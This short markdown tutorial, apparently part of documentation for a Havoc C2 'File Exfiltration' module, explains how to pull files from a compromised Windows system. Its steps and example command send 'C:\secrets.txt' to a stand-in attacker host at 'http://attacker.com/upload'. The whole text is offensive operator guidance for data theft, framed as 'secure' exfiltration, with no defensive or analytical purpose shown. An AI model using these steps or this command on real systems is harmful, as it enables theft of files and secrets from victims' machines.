
---

#### **8. File Exfiltration**

**File**: `File_Exfiltration.md`

# Exfiltrating Files Securely

## Description
This tutorial explains how to use the **File Exfiltration** module to securely exfiltrate files from a compromised system.

## Requirements
- **Operating System**: Windows.
- **Havoc C2**: The File Exfiltration module must be loaded.

## Steps
1. **Preparation**:
   - Load the **File Exfiltration** module in Havoc C2.

2. **Execution**:
   - Use the command `exfiltrate_file [file_path] [server_url]` to exfiltrate a file to a remote server.

3. **Verification**:
   - Verify the file exfiltration by checking the remote server.

## Example Command
```bash
exfiltrate_file "C:\\secrets.txt" "http://attacker.com/upload"